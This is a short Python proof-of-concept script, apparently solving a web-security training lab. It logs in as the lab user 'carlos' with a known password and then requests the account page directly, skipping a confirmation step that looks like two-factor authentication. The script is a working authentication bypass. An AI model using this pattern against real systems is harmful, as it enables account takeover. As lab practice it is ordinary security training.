import requests as rs
import sys
import urllib3  

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable insecure request warning

proxies = {
    'http' : 'http://127.0.0.1:8080' ,
    'https' : 'http://127.0.0.1:8080'
}

def access_carlos_account(s , url):
    
    # login into carlos ac
    sys.stdout.write("Login into carlos account...\n")
    login_url = url + '/login'   # login page
    login_data = {
        'username' : 'carlos' ,
        'password' : 'montoya' 
    }
    r = s.post(
        login_url ,
        data=login_data,
        proxies=proxies,
        verify=False,
        allow_redirects=False
    )

    #  bypass confirm
    myaccount_url = url + '/my-account'
    r = s.get(
        myaccount_url ,
        proxies=proxies,
        verify=False
    )

    # check lab solve or not
    if "Log out" in r.text:
        sys.stdout.write("Lab solved successfully\n")
    else:
        sys.stdout.write("Lab not solved\n")


def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage : python3 poc.py <url>\n")
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]
    access_carlos_account(s , url)

    
if __name__ == "__main__":
    main()